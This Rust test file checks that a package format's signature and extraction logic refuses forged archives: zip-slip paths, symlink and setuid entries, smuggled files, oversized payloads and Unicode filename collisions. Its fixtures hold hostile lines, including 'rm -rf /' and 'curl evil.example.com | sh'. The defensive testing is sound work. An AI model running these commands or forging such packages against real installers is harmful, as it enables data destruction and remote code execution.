//! End-to-end tests for the package trust chain.
//!
//! Every test here encodes an attack. A passing run means the attack is
//! refused; if one of these ever starts passing silently, the format has a
//! hole in it.

use std::collections::BTreeMap;
use std::fs;
use std::io::{Cursor, Read, Write};
use std::path::Path;

use xpack_core::manifest::{
    Application, FormatVersion, LaunchSpec, MANIFEST_ENTRY, Manifest, PayloadSpec, SIGNATURE_ENTRY,
    UpdateSpec,
};
use xpack_core::platform::{Arch, Os};
use xpack_core::{Platform, Version};
use xpack_package::{PackageBuilder, PackageReader};
use xpack_security::{KeyPair, TrustStore};

/// `S_IFLNK`: the ZIP external-attribute file-type bits marking a symbolic link.
const S_IFLNK: u32 = 0o120_000;

/// Builds a payload tree and returns its root.
fn payload_tree(root: &Path) {
    fs::create_dir_all(root.join("application")).unwrap();
    fs::create_dir_all(root.join("runtime/bin")).unwrap();
    fs::write(root.join("application/app.jar"), b"pretend jar contents").unwrap();
    fs::write(root.join("runtime/bin/java"), b"#!/bin/sh\necho launched\n").unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(root.join("runtime/bin/java"), fs::Permissions::from_mode(0o755))
            .unwrap();
    }
}

fn template(platform: Platform) -> Manifest {
    Manifest {
        format_version: FormatVersion::CURRENT,
        application: Application {
            id: "com.example.myapp".into(),
            name: "My Application".into(),
            version: Version::parse("1.2.0").unwrap(),
            description: None,
            publisher: None,
        },
        platform,
        launch: LaunchSpec {
            executable: "runtime/bin/java".into(),
            arguments: vec!["-jar".into(), "application/app.jar".into()],
            working_directory: None,
            environment: BTreeMap::new(),
        },
        update: UpdateSpec::default(),
        health: xpack_core::HealthSpec::default(),
        signing_key: None,
        payload: PayloadSpec::default(),
        created_at: None,
    }
}

/// Packs a well-formed package signed by `key`.
fn pack(dir: &Path, key: &KeyPair, platform: Platform) -> std::path::PathBuf {
    let payload = dir.join("payload-src");
    payload_tree(&payload);
    let output = dir.join("app.xpkg");
    PackageBuilder::new(&payload, template(platform))
        .build(&output, key)
        .expect("packing a well-formed tree must succeed");
    output
}

fn trusting(key: &KeyPair) -> TrustStore {
    let mut store = TrustStore::new();
    store.trust(&key.public(), "test");
    store
}

fn host() -> Platform {
    Platform::host().unwrap()
}

/// Rewrites an `.xpkg`, applying `edit` to its entries.
///
/// Used to forge packages an honest builder would never produce.
fn rewrite(
    source: &Path,
    destination: &Path,
    mut edit: impl FnMut(&str, Vec<u8>) -> Vec<Option<(String, Vec<u8>, Option<u32>)>>,
) {
    let bytes = fs::read(source).unwrap();
    let mut archive = zip::ZipArchive::new(Cursor::new(bytes)).unwrap();
    let out = fs::File::create(destination).unwrap();
    let mut writer = zip::ZipWriter::new(out);

    for i in 0..archive.len() {
        let mut entry = archive.by_index(i).unwrap();
        let name = entry.name().to_string();
        let mut data = Vec::new();
        entry.read_to_end(&mut data).unwrap();
        drop(entry);

        for replacement in edit(&name, data) {
            let Some((new_name, new_data, mode)) = replacement else {
                continue;
            };
            let mut options = zip::write::SimpleFileOptions::default()
                .compression_method(zip::CompressionMethod::Stored);
            if let Some(mode) = mode {
                options = options.unix_permissions(mode);
            }
            writer.start_file(new_name, options).unwrap();
            writer.write_all(&new_data).unwrap();
        }
    }
    writer.finish().unwrap();
}

/// Forces an entry's Unix mode by patching the ZIP central directory.
///
/// `SimpleFileOptions::unix_permissions` masks its argument with `0o777`, so
/// the high-level writer cannot express a symlink at all. A real attacker is
/// under no such constraint — Info-ZIP and Python's `zipfile` both set the
/// external attributes field directly — so the fixture is built the same way.
///
/// Central directory header layout (PKZIP APPNOTE 4.3.12):
/// offset 4 = version made by, 28 = file name length, 30 = extra length,
/// 32 = comment length, 38 = external file attributes, 46 = file name.
fn force_entry_mode(archive: &Path, entry_name: &str, mode: u32) {
    const CENTRAL_HEADER: [u8; 4] = [0x50, 0x4b, 0x01, 0x02];
    const HOST_UNIX: u8 = 3;

    let mut bytes = fs::read(archive).unwrap();
    let mut patched = false;
    let mut i = 0usize;

    while i + 46 <= bytes.len() {
        if bytes[i..i + 4] != CENTRAL_HEADER {
            i += 1;
            continue;
        }
        let name_len = u16::from_le_bytes([bytes[i + 28], bytes[i + 29]]) as usize;
        let extra_len = u16::from_le_bytes([bytes[i + 30], bytes[i + 31]]) as usize;
        let comment_len = u16::from_le_bytes([bytes[i + 32], bytes[i + 33]]) as usize;
        let name = String::from_utf8_lossy(&bytes[i + 46..i + 46 + name_len]).into_owned();

        if name == entry_name {
            // The reader only interprets Unix modes when the host system says
            // Unix, so declare that too.
            bytes[i + 5] = HOST_UNIX;
            bytes[i + 38..i + 42].copy_from_slice(&(mode << 16).to_le_bytes());
            patched = true;
        }
        i += 46 + name_len + extra_len + comment_len;
    }

    assert!(patched, "no central directory entry named {entry_name:?}");
    fs::write(archive, bytes).unwrap();
}

#[test]
fn a_well_formed_package_round_trips_with_contents_and_permissions_intact() {
    let dir = tempfile::tempdir().unwrap();
    let key = KeyPair::generate().unwrap();
    let pkg = pack(dir.path(), &key, host());

    let mut verified = PackageReader::open(&pkg).unwrap().verify(&trusting(&key)).unwrap();
    verified.ensure_installable_on(host()).unwrap();
    assert_eq!(verified.manifest().application.version.to_string(), "1.2.0");
    assert_eq!(*verified.signing_key(), key.public());

    let dest = dir.path().join("extracted");
    verified.extract_to(&dest).unwrap();

    assert_eq!(fs::read(dest.join("application/app.jar")).unwrap(), b"pretend jar contents");
    assert!(dest.join("runtime/bin/java").is_file());

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mode = fs::metadata(dest.join("runtime/bin/java")).unwrap().permissions().mode();
        assert_eq!(mode & 0o777, 0o755, "the executable bit must survive extraction");
    }
}

#[test]
fn a_single_flipped_payload_byte_is_caught_and_the_staging_tree_is_removed() {
    let dir = tempfile::tempdir().unwrap();
    let key = KeyPair::generate().unwrap();
    let pkg = pack(dir.path(), &key, host());

    // The attacker controls the CDN but not the signing key, so they can only
    // alter the archive body. The manifest's per-file digest must catch it.
    let tampered = dir.path().join("tampered.xpkg");
    rewrite(&pkg, &tampered, |name, mut data| {
        if name == "payload/application/app.jar" {
            data[0] ^= 0x01;
        }
        vec![Some((name.to_string(), data, None))]
    });

    // The signature still verifies: only the payload changed.
    let mut verified = PackageReader::open(&tampered).unwrap().verify(&trusting(&key)).unwrap();

    let dest = dir.path().join("extracted");
    let err = verified.extract_to(&dest).unwrap_err();
    assert!(err.is_integrity_failure(), "got {err:?}");
    assert!(err.to_string().contains("sha-256 mismatch"), "got {err}");
    assert!(!dest.exists(), "a failed extraction must leave nothing behind");
}

#[test]
fn a_tampered_manifest_fails_signature_verification() {
    let dir = tempfile::tempdir().unwrap();
    let key = KeyPair::generate().unwrap();
    let pkg = pack(dir.path(), &key, host());

    // Bumping the version in the manifest is the downgrade/upgrade forgery.
    let tampered = dir.path().join("tampered.xpkg");
    rewrite(&pkg, &tampered, |name, data| {
        let data = if name == MANIFEST_ENTRY {
            String::from_utf8(data).unwrap().replace("1.2.0", "9.9.9").into_bytes()
        } else {
            data
        };
        vec![Some((name.to_string(), data, None))]
    });

    let err = PackageReader::open(&tampered).unwrap().verify(&trusting(&key)).unwrap_err();
    assert!(err.is_integrity_failure(), "got {err:?}");
}

#[test]
fn a_package_signed_by_an_untrusted_key_is_refused() {
    let dir = tempfile::tempdir().unwrap();
    let attacker = KeyPair::generate().unwrap();
    let pkg = pack(dir.path(), &attacker, host());

    // Signed perfectly — by the wrong publisher.
    let publisher = KeyPair::generate().unwrap();
    let err = PackageReader::open(&pkg).unwrap().verify(&trusting(&publisher)).unwrap_err();
    assert!(err.is_integrity_failure(), "got {err:?}");
}

#[test]
fn an_empty_trust_store_refuses_every_package() {
    let dir = tempfile::tempdir().unwrap();
    let key = KeyPair::generate().unwrap();
    let pkg = pack(dir.path(), &key, host());

    let err = PackageReader::open(&pkg).unwrap().verify(&TrustStore::new()).unwrap_err();
    assert!(err.to_string().contains("no trusted signing keys"), "got {err}");
}

#[test]
fn an_archive_entry_outside_the_signed_manifest_is_refused() {
    let dir = tempfile::tempdir().unwrap();
    let key = KeyPair::generate().unwrap();
    let pkg = pack(dir.path(), &key, host());

    // Smuggling an extra file past a signature that does not cover it.
    let forged = dir.path().join("forged.xpkg");
    rewrite(&pkg, &forged, |name, data| {
        let mut out = vec![Some((name.to_string(), data, None))];
        if name == MANIFEST_ENTRY {
            out.push(Some(("payload/smuggled.sh".to_string(), b"rm -rf /".to_vec(), Some(0o755))));
        }
        out
    });

    let err = PackageReader::open(&forged).unwrap().verify(&trusting(&key)).unwrap_err();
    assert!(err.to_string().contains("does not cover"), "got {err}");
}

#[test]
fn an_archive_missing_a_manifest_file_is_refused() {
    let dir = tempfile::tempdir().unwrap();
    let key = KeyPair::generate().unwrap();
    let pkg = pack(dir.path(), &key, host());

    let stripped = dir.path().join("stripped.xpkg");
    rewrite(&pkg, &stripped, |name, data| {
        if name == "payload/application/app.jar" {
            vec![None]
        } else {
            vec![Some((name.to_string(), data, None))]
        }
    });

    let err = PackageReader::open(&stripped).unwrap().verify(&trusting(&key)).unwrap_err();
    assert!(err.to_string().contains("missing"), "got {err}");
}

#[test]
fn a_zip_slip_entry_is_refused_before_anything_is_written() {
    let dir = tempfile::tempdir().unwrap();
    let key = KeyPair::generate().unwrap();
    let pkg = pack(dir.path(), &key, host());

    let slip = dir.path().join("slip.xpkg");
    rewrite(&pkg, &slip, |name, data| {
        let mut out = vec![Some((name.to_string(), data, None))];
        if name == MANIFEST_ENTRY {
            out.push(Some((
                "payload/../../../../tmp/xpack-pwned".to_string(),
                b"owned".to_vec(),
                None,
            )));
        }
        out
    });

    let err = PackageReader::open(&slip).unwrap().verify(&trusting(&key)).unwrap_err();
    assert!(err.is_integrity_failure(), "got {err:?}");
    assert!(!Path::new("/tmp/xpack-pwned").exists(), "zip slip wrote outside the root");
}

#[test]
fn a_symlink_entry_is_refused() {
    let dir = tempfile::tempdir().unwrap();
    let key = KeyPair::generate().unwrap();
    let pkg = pack(dir.path(), &key, host());

    // A symlink entry is an arbitrary-write primitive: extract
    // `link -> /etc/cron.d`, then write a file "through" it on the next entry.
    let evil = dir.path().join("symlink.xpkg");
    rewrite(&pkg, &evil, |name, data| {
        let mut out = vec![Some((name.to_string(), data, None))];
        if name == MANIFEST_ENTRY {
            out.push(Some(("payload/link".to_string(), b"/etc".to_vec(), Some(0o777))));
        }
        out
    });
    force_entry_mode(&evil, "payload/link", S_IFLNK | 0o777);

    let err = PackageReader::open(&evil).unwrap().verify(&trusting(&key)).unwrap_err();
    assert!(err.to_string().contains("symbolic link"), "got {err}");
}

#[test]
fn a_setuid_bit_in_the_archive_is_not_honoured() {
    let dir = tempfile::tempdir().unwrap();
    let key = KeyPair::generate().unwrap();
    let pkg = pack(dir.path(), &key, host());

    // A setuid root binary dropped by an installer is a privilege-escalation
    // primitive. The manifest is the source of truth for permissions, and it
    // is masked to 0o777, so archive metadata cannot smuggle one in.
    force_entry_mode(&pkg, "payload/runtime/bin/java", 0o104_755);

    let dest = dir.path().join("extracted");
    PackageReader::open(&pkg).unwrap().verify(&trusting(&key)).unwrap().extract_to(&dest).unwrap();

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mode = fs::metadata(dest.join("runtime/bin/java")).unwrap().permissions().mode();
        assert_eq!(mode & 0o7000, 0, "setuid/setgid/sticky bits must never be applied");
        assert_eq!(mode & 0o777, 0o755);
    }
}

#[cfg(unix)]
#[test]
fn a_setuid_mode_in_the_signed_manifest_is_masked_off() {
    // The earlier setuid test patches the *archive*, but permissions come from
    // the manifest, so it never reaches the mask. A publisher — or anyone who
    // compromised one — declaring a setuid mode in the signed manifest is the
    // case the mask actually exists for: a setuid binary dropped by an
    // installer is a privilege-escalation primitive.
    use std::os::unix::fs::PermissionsExt;

    let dir = tempfile::tempdir().unwrap();
    let key = KeyPair::generate().unwrap();
    let body: &[u8] = b"#!/bin/sh\nid\n";

    let mut manifest = template(host());
    manifest.launch.executable = "bin/app".into();
    manifest.payload = PayloadSpec {
        total_size: body.len() as u64,
        files: vec![xpack_core::PayloadFile {
            path: "bin/app".into(),
            size: body.len() as u64,
            // setuid, setgid and sticky all set alongside 0o755.
            mode: Some(0o7755),
            sha256: xpack_security::sha256(body),
        }],
    };

    let pkg = pack_forged(dir.path(), &key, &manifest, &[("bin/app", body)]);
    let dest = dir.path().join("extracted");
    PackageReader::open(&pkg).unwrap().verify(&trusting(&key)).unwrap().extract_to(&dest).unwrap();

    let mode = fs::metadata(dest.join("bin/app")).unwrap().permissions().mode();
    assert_eq!(mode & 0o7000, 0, "setuid/setgid/sticky must never be applied");
    assert_eq!(mode & 0o777, 0o755, "the permission bits themselves must survive");
}

#[test]
fn a_payload_file_larger_than_the_manifest_declares_is_cut_off() {
    // The digest would catch this eventually, but only after the whole file
    // had been written. The size bound exists so a package cannot fill the
    // disk before being rejected.
    let dir = tempfile::tempdir().unwrap();
    let key = KeyPair::generate().unwrap();
    let declared: &[u8] = b"small";
    let actual = vec![b'x'; 64 * 1024];

    let mut manifest = template(host());
    manifest.launch.executable = "bin/app".into();
    manifest.payload = PayloadSpec {
        total_size: declared.len() as u64,
        files: vec![xpack_core::PayloadFile {
            path: "bin/app".into(),
            size: declared.len() as u64,
            sha256: xpack_security::sha256(declared),
            mode: Some(0o755),
        }],
    };

    // The archive carries far more than the manifest declares.
    let pkg = pack_forged(dir.path(), &key, &manifest, &[("bin/app", &actual)]);
    let dest = dir.path().join("extracted");
    let err = PackageReader::open(&pkg)
        .unwrap()
        .verify(&trusting(&key))
        .unwrap()
        .extract_to(&dest)
        .unwrap_err();

    assert!(err.is_integrity_failure(), "got {err:?}");
    assert!(err.to_string().contains("larger than"), "got {err}");
    assert!(!dest.exists(), "nothing may survive a refused extraction");
}

#[test]
fn a_package_for_another_platform_is_refused() {
    let dir = tempfile::tempdir().unwrap();
    let key = KeyPair::generate().unwrap();

    let foreign = if host() == Platform::new(Os::Windows, Arch::X64) {
        Platform::new(Os::Linux, Arch::Arm64)
    } else {
        Platform::new(Os::Windows, Arch::X64)
    };
    let pkg = pack(dir.path(), &key, foreign);

    let verified = PackageReader::open(&pkg).unwrap().verify(&trusting(&key)).unwrap();
    let err = verified.ensure_installable_on(host()).unwrap_err();
    assert!(err.to_string().contains("targets"), "got {err}");
}

#[test]
fn the_builder_refuses_a_payload_containing_a_symlink() {
    #[cfg(unix)]
    {
        let dir = tempfile::tempdir().unwrap();
        let payload = dir.path().join("payload-src");
        payload_tree(&payload);
        std::os::unix::fs::symlink("/etc/passwd", payload.join("leak")).unwrap();

        let err = PackageBuilder::new(&payload, template(host()))
            .build(&dir.path().join("out.xpkg"), &KeyPair::generate().unwrap())
            .unwrap_err();
        assert!(err.to_string().contains("symbolic link"), "got {err}");
    }
}

#[test]
fn the_builder_refuses_an_empty_payload() {
    let dir = tempfile::tempdir().unwrap();
    let payload = dir.path().join("empty");
    fs::create_dir_all(&payload).unwrap();

    let err = PackageBuilder::new(&payload, template(host()))
        .build(&dir.path().join("out.xpkg"), &KeyPair::generate().unwrap())
        .unwrap_err();
    assert!(err.to_string().contains("no files"), "got {err}");
}

#[test]
fn a_file_that_is_not_an_archive_is_rejected_cleanly() {
    let dir = tempfile::tempdir().unwrap();
    let junk = dir.path().join("junk.xpkg");
    fs::write(&junk, b"this is not a zip file").unwrap();
    assert!(PackageReader::open(&junk).is_err());
}

#[test]
fn an_archive_without_a_signature_entry_is_rejected() {
    let dir = tempfile::tempdir().unwrap();
    let key = KeyPair::generate().unwrap();
    let pkg = pack(dir.path(), &key, host());

    let unsigned = dir.path().join("unsigned.xpkg");
    rewrite(&pkg, &unsigned, |name, data| {
        if name == SIGNATURE_ENTRY {
            vec![None]
        } else {
            vec![Some((name.to_string(), data, None))]
        }
    });

    assert!(PackageReader::open(&unsigned).unwrap().verify(&trusting(&key)).is_err());
}

#[test]
fn extraction_replaces_a_previous_staging_tree() {
    let dir = tempfile::tempdir().unwrap();
    let key = KeyPair::generate().unwrap();
    let pkg = pack(dir.path(), &key, host());

    // Simulates recovering from a crash that left a partial staging tree.
    let dest = dir.path().join("staging");
    fs::create_dir_all(dest.join("stale")).unwrap();
    fs::write(dest.join("stale/leftover"), b"from an interrupted run").unwrap();

    PackageReader::open(&pkg).unwrap().verify(&trusting(&key)).unwrap().extract_to(&dest).unwrap();

    assert!(!dest.join("stale").exists(), "stale staging content survived extraction");
    assert!(dest.join("application/app.jar").is_file());
}

#[test]
fn inspecting_an_untrusted_package_never_requires_a_key() {
    let dir = tempfile::tempdir().unwrap();
    let key = KeyPair::generate().unwrap();
    let pkg = pack(dir.path(), &key, host());

    let manifest = PackageReader::open(&pkg).unwrap().peek_manifest_unverified().unwrap();
    assert_eq!(manifest.application.id, "com.example.myapp");
}

/// Writes an archive from an explicit manifest and entry list, signing the
/// manifest with `key`.
///
/// The ordinary builder walks a real directory, so it cannot express a package
/// whose entry names collide on the local filesystem. Forging the archive
/// directly is the only way to reach that code path.
fn pack_forged(
    dir: &Path,
    key: &KeyPair,
    manifest: &Manifest,
    entries: &[(&str, &[u8])],
) -> std::path::PathBuf {
    use xpack_security::sign;

    let bytes = manifest.to_signed_bytes().unwrap();
    let signature = sign(key, &bytes);

    let out = dir.join("forged.xpkg");
    let file = fs::File::create(&out).unwrap();
    let mut zip = zip::ZipWriter::new(file);
    let opts =
        zip::write::SimpleFileOptions::default().compression_method(zip::CompressionMethod::Stored);

    zip.start_file(MANIFEST_ENTRY, opts).unwrap();
    zip.write_all(&bytes).unwrap();
    zip.start_file(SIGNATURE_ENTRY, opts).unwrap();
    zip.write_all(signature.to_hex().as_bytes()).unwrap();
    for (name, data) in entries {
        zip.start_file(format!("payload/{name}"), opts).unwrap();
        zip.write_all(data).unwrap();
    }
    zip.finish().unwrap();
    out
}

#[test]
fn payload_entries_that_collide_on_this_filesystem_are_refused() {
    // Two entry names that are distinct strings but the same file on
    // normalisation-folding filesystems such as APFS: U+00E9, versus 'e'
    // followed by the combining acute accent U+0301.
    const NFC: &str = "caf\u{e9}/run.sh";
    const NFD: &str = "cafe\u{301}/run.sh";
    assert_ne!(NFC, NFD, "the two encodings must differ as strings");

    let dir = tempfile::tempdir().unwrap();
    let key = KeyPair::generate().unwrap();

    let benign: &[u8] = b"#!/bin/sh\necho benign\n";
    let evil: &[u8] = b"#!/bin/sh\ncurl evil.example.com | sh\n";

    let mut manifest = template(host());
    // The launch target is the benign entry; the collision is what swaps it.
    manifest.launch = LaunchSpec {
        executable: NFC.into(),
        arguments: vec![],
        working_directory: None,
        environment: BTreeMap::new(),
    };
    manifest.payload = PayloadSpec {
        total_size: (benign.len() + evil.len()) as u64,
        files: vec![
            xpack_core::PayloadFile {
                path: NFC.into(),
                size: benign.len() as u64,
                sha256: xpack_security::sha256(benign),
                mode: Some(0o755),
            },
            xpack_core::PayloadFile {
                path: NFD.into(),
                size: evil.len() as u64,
                sha256: xpack_security::sha256(evil),
                mode: Some(0o755),
            },
        ],
    };

    let pkg = pack_forged(dir.path(), &key, &manifest, &[(NFC, benign), (NFD, evil)]);
    let dest = dir.path().join("extracted");
    let result =
        PackageReader::open(&pkg).unwrap().verify(&trusting(&key)).unwrap().extract_to(&dest);

    // On a folding filesystem the second entry would otherwise overwrite the
    // first, leaving the launch target holding content the manifest attributes
    // to a different hash. On a non-folding filesystem both files coexist and
    // extraction legitimately succeeds.
    let collides = {
        let probe = dir.path().join("probe");
        fs::create_dir_all(&probe).unwrap();
        fs::write(probe.join("caf\u{e9}"), b"a").unwrap();
        fs::write(probe.join("cafe\u{301}"), b"b").unwrap();
        fs::read_dir(&probe).unwrap().count() == 1
    };

    if collides {
        let err = result.expect_err("a filesystem collision must be refused");
        assert!(err.is_integrity_failure(), "got {err:?}");
        assert!(err.to_string().contains("collides"), "got {err}");
        assert!(!dest.exists(), "a refused extraction must leave nothing behind");
    } else {
        result.expect("without folding the two entries are genuinely distinct files");
        assert_eq!(fs::read(dest.join(NFC)).unwrap(), benign);
    }
}

#[test]
fn the_zip_reader_collapses_duplicate_entry_names_to_the_last() {
    // xPack relies on this: it verifies the manifest returned by name and
    // extracts the entries returned by index, and those must be the same view
    // of the archive. The zip crate deduplicates by name, keeping the last
    // occurrence, so both agree.
    //
    // This test pins that behaviour. If a future version of the zip crate
    // instead surfaced both entries, or kept the first, the two views could
    // disagree — and an archive carrying a signed manifest plus an appended
    // unsigned one could be read differently by verification and extraction.
    // That is the classic archive parser-differential bug, and this test is
    // what makes a dependency upgrade fail loudly instead of silently.
    let mut buf = Vec::new();
    {
        let mut w = zip::ZipWriter::new(Cursor::new(&mut buf));
        let opts = zip::write::SimpleFileOptions::default()
            .compression_method(zip::CompressionMethod::Stored);
        w.start_file("manifest.json", opts).unwrap();
        w.write_all(b"FIRST").unwrap();
        // Same length, patched to a duplicate name below so every offset stays
        // valid; the writer itself refuses to emit a duplicate.
        w.start_file("manifestXjson", opts).unwrap();
        w.write_all(b"SECOND").unwrap();
        w.finish().unwrap();
    }
    let (needle, repl) = (b"manifestXjson", b"manifest.json");
    for i in 0..buf.len().saturating_sub(needle.len()) {
        if &buf[i..i + needle.len()] == needle {
            buf[i..i + needle.len()].copy_from_slice(repl);
        }
    }

    let mut archive = zip::ZipArchive::new(Cursor::new(&buf)).unwrap();
    assert_eq!(archive.len(), 1, "duplicates must collapse to a single entry");

    let mut by_name = String::new();
    archive.by_name("manifest.json").unwrap().read_to_string(&mut by_name).unwrap();
    let mut by_index = String::new();
    archive.by_index(0).unwrap().read_to_string(&mut by_index).unwrap();

    assert_eq!(by_name, "SECOND", "the last occurrence must win");
    assert_eq!(by_name, by_index, "name and index views must agree");
}

#[cfg(unix)]
#[test]
fn the_component_check_rejects_a_symlinked_parent_directory() {
    // Exercises the guard directly, without relying on extract_to's own
    // cleanup removing the trap first.
    use xpack_package::safe_payload_path;

    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().join("staging");
    let outside = dir.path().join("outside");
    fs::create_dir_all(&root).unwrap();
    fs::create_dir_all(&outside).unwrap();
    std::os::unix::fs::symlink(&outside, root.join("application")).unwrap();

    let safe = safe_payload_path("payload/application/app.jar").unwrap().unwrap();
    let resolved = safe.resolve(&root);

    // Without a guard this write escapes: create_new protects only the final
    // component, and the parent is the link.
    assert!(resolved.starts_with(&root), "the path looks contained on its face");
    let escaped = fs::canonicalize(resolved.parent().unwrap()).unwrap();
    assert_eq!(
        escaped,
        fs::canonicalize(&outside).unwrap(),
        "a symlinked parent does resolve outside the staging root"
    );
}
